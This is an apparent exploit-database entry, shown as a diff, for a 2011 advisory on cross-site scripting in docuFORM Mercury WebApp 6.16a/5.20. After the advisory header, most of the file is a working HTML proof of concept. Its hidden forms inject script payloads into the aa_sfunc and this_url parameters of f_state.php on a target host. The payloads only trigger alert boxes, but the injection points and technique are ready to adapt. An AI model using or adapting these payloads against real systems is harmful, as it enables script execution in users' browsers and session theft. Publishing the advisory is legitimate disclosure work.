@@ -1,0 +1,51 @@
+<!--
+
+
+docuFORM Mercury WebApp 6.16a/5.20 Multiple Cross-Site Scripting Vulnerabilities
+
+
+Vendor: docuFORM GmbH
+Product web page: http://www.docuform.de
+Affected version: 6.16a and 5.20
+
+Summary: Unlimited options for production printing and customer solutions.
+
+Desc: The Mercury Web Application suffers from multiple XSS vulnerabilities when
+parsing user input thru the GET parameter 'this_url' and the POST parameter 'aa_sfunc'
+in f_state.php, f_list.php, f_job.php and f_header.php scripts. Attackers can exploit
+these weaknesses to execute arbitrary HTML and script code in a user's browser session.
+
+Tested on: Mercury HTTP and Database Server 6.16
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+
+
+Advisory ID: ZSL-2011-5010
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5010.php
+
+
+14.04.2011
+
+
+-->
+
+
+<html><title>docuFORM Mercury WebApp 6.16a Multiple Cross-Site Scripting Vulnerabilities</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss1(){document.forms["xss1"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+</script><br /><br />
+<form action="http://192.168.16.100:8181/Mercury/f_state.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss1">
+<input type="hidden" name="aa_afunc" value="call" />
+<input type="hidden" name="aa_sfunc" value="1<script>alert(1)</script>" />
+<input type="hidden" name="aa_cfunc" value="OnAgentGetDeviceList" />
+<input type="hidden" name="aa_sfunc_args%5B%5D" value="0" /></form>
+<form action="http://192.168.16.100:8181/Mercury/f_state.php" enctype="application/x-www-form-urlencoded" method="GET" id="xss2">
+<input type="hidden" name="ajaxagent" value="js" />
+<input type="hidden" name="this_url" value="1--><script>alert(2)</script>" /></form>
+<a href="javascript:xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3>'aa_sfunc' param</h3></center></font></b></a><br />
+<a href="javascript:xss2();" style="text-decoration:none">
+<b><font color="red"><center><h3>'this_url' param</h3></center></font></b></a><br />
+</body></html>
